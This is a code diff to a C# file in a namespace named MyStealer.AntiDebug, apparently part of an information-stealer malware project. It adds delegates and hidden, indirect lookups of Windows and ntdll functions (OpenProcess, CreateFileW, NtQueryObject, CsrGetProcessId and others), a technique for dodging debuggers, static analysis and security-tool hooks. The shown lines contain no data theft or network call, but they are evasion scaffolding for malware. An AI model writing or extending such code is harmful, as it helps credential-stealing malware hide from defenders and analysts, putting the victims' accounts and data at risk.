@@ -1,6 +1,7 @@
 ﻿using System.Runtime.InteropServices;
 using System;
 using System.Text;
+using static MyStealer.AntiDebug.NativeCalls;
 
 namespace MyStealer.AntiDebug
 {
@@ -49,6 +50,15 @@ namespace MyStealer.AntiDebug
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate IntPtr DGetModuleHandleA(string name);
 
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate IntPtr DOpenProcess(uint desiredAccess, [MarshalAs(UnmanagedType.Bool)] bool inheritHandle, uint processId);
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate IntPtr DCreateFileW([MarshalAs(UnmanagedType.LPWStr)] string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate uint DGetModuleFileNameW(IntPtr module, StringBuilder fileName, uint size);
+
         // user32
 
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
@@ -83,6 +93,12 @@ namespace MyStealer.AntiDebug
         [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         internal delegate uint DNtQuerySystemInformation_KernelDebuggerInfo(uint SystemInformationClass, ref SYSTEM_KERNEL_DEBUGGER_INFORMATION SystemInformation, uint SystemInformationLength, out uint ReturnLength);
 
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate uint DCsrGetProcessId();
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        internal delegate uint DNtQueryObject(IntPtr Handle, uint ObjectInformationClass, IntPtr ObjectInformation, uint ObjectInformationLength, out uint ReturnLength);
+
         #endregion
 
         #region Variable declarations
@@ -115,6 +131,12 @@ namespace MyStealer.AntiDebug
 
         internal static DGetModuleHandleA GetModuleHandleA { get; private set; }
 
+        internal static DOpenProcess OpenProcess { get; private set; }
+
+        internal static DCreateFileW CreateFileW { get; private set; }
+
+        internal static DGetModuleFileNameW GetModuleFileNameW { get; private set; }
+
         // user32
 
         internal static DGetForegroundWindow GetForegroundWindow { get; private set; }
@@ -139,6 +161,10 @@ namespace MyStealer.AntiDebug
 
         internal static DNtQuerySystemInformation_KernelDebuggerInfo NtQuerySystemInformation_KernelDebuggerInfo { get; private set; }
 
+        internal static DCsrGetProcessId CsrGetProcessId { get; private set; }
+
+        internal static DNtQueryObject NtQueryObject { get; private set; }
+
         #endregion
 
         private static void InitIndirectCalls()
@@ -159,6 +185,9 @@ namespace MyStealer.AntiDebug
             QueryFullProcessImageNameA = Marshal.GetDelegateForFunctionPointer<DQueryFullProcessImageNameA>(MyGetProcAddress(kernel32, "QueryFullProcessImageNameA"));
             IsProcessCritical = Marshal.GetDelegateForFunctionPointer<DIsProcessCritical>(MyGetProcAddress(kernel32, "IsProcessCritical"));
             GetModuleHandleA = Marshal.GetDelegateForFunctionPointer<DGetModuleHandleA>(MyGetProcAddress(kernel32, "GetModuleHandleA"));
+            OpenProcess = Marshal.GetDelegateForFunctionPointer<DOpenProcess>(MyGetProcAddress(kernel32, "OpenProcess"));
+            CreateFileW = Marshal.GetDelegateForFunctionPointer<DCreateFileW>(MyGetProcAddress(kernel32, "CreateFileW"));
+            GetModuleFileNameW = Marshal.GetDelegateForFunctionPointer<DGetModuleFileNameW>(MyGetProcAddress(kernel32, "GetModuleFileNameW"));
 
             // user32
             var user32 = LoadLibrary("user32.dll"); // user32 is not loaded by default
@@ -177,6 +206,8 @@ namespace MyStealer.AntiDebug
             NtQueryInformationProcess_ProcessBasicInfo = Marshal.GetDelegateForFunctionPointer<DNtQueryInformationProcess_ProcessBasicInfo>(MyGetProcAddress(ntdll, "NtQueryInformationProcess"));
             NtQuerySystemInformation_CodeIntegrityInfo = Marshal.GetDelegateForFunctionPointer<DNtQuerySystemInformation_CodeIntegrityInfo>(MyGetProcAddress(ntdll, "NtQuerySystemInformation"));
             NtQuerySystemInformation_KernelDebuggerInfo = Marshal.GetDelegateForFunctionPointer<DNtQuerySystemInformation_KernelDebuggerInfo>(MyGetProcAddress(ntdll, "NtQuerySystemInformation"));
+            CsrGetProcessId = Marshal.GetDelegateForFunctionPointer<DCsrGetProcessId>(MyGetProcAddress(ntdll, "CsrGetProcessId"));
+            NtQueryObject = Marshal.GetDelegateForFunctionPointer<DNtQueryObject>(MyGetProcAddress(ntdll, "NtQueryObject"));
         }
     }
 }
